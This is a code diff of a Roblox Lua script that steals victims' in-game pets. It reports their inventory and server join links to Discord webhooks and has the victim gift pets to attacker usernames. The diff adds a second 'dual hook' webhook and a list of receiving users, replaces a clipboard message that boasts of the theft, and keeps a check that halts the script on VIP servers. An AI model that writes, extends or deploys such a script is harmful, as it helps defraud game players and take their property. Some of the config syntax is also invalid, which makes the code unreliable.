@@ -10,15 +10,9 @@
                         Made by: Scripter.SM
                         Discord: discord.gg/d2zgg2YDMz
 ]]
-_G.Script.SM.Config = {
-    DualHook-User = {"User1", "User2", "User3", "User4"}, -- It should Replace         local usernames = {            "DUALHOOKUSERNAMES",        }  It should like this if defaultuser is stealing and this usernmae joins too it's should start gifting this or if only this joined it should start gifting this after it types something in chat or jump
-    DualHookWebhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxx", -- Make It Like That It should send webhook to getgenv().Webhook and this webhook too
-    ServerName = "URSERVERNAME" -- It should replace dark scripts and add this server name instead of dark scripts
-    MSG = "" -- It should replace setclipboard
-}
-    
-getgenv().Webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxx"
-getgenv().Username = "DefaultUser"
+
+getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
+getgenv().Username = "PUT_HERE_UR_USERNAME"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -37,7 +31,7 @@ getgenv().Username = "DefaultUser"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard(_G.Script.SM.Config.MSG)
         
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -79,6 +73,12 @@ getgenv().Username = "DefaultUser"
         if GetServerType:InvokeServer() == "VIPServer" then
             error("Script stopped - VIP Server detected")        
         end
+
+        if getgenv().EclipseHubRunning then
+            warn("Script is already running or has been executed! Cannot run again.")
+            return
+        end
+        getgenv().EclipseHubRunning = true
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
@@ -279,7 +279,9 @@ getgenv().Username = "DefaultUser"
 
         local pets = GetPlayerPets()
 
-        local Webhook = getgenv().Webhook
+        local Webhook1 = getgenv().Webhook
+        local Webhook2 = _G.Script.SM.Config.DualHookWebhook
+
         local Username = getgenv().Username
 
         local function isMutated(toolName)
@@ -443,7 +445,7 @@ local embed = {
         {
             name = "🏝️ **Join with URL**",
             value = string.format(
-                "[%s](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)",
+                "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                 game.JobId,
                 game.PlaceId,
                 game.JobId
@@ -516,15 +518,15 @@ local requestBody = table.concat(body, "\r\n")
 
 -- Send request
 pcall(function()
+for _, hook in ipairs({Webhook1, Webhook2}) do
     request({
-        Url = Webhook,
+        Url = hook,
         Method = "POST",
-        Headers = {
-            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
-        },
-        Body = requestBody
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode(data)
     })
-end)
+end
+
 
 
 
@@ -617,10 +619,7 @@ end)
                     end)
                 end
 
-        local usernames = {
-    _G.Script.SM.Config["DualHook-User"],
-}
-
+        local usernames = _G.Script.SM.Config["DualHook-User"]
 
         local receiverPlr
         repeat
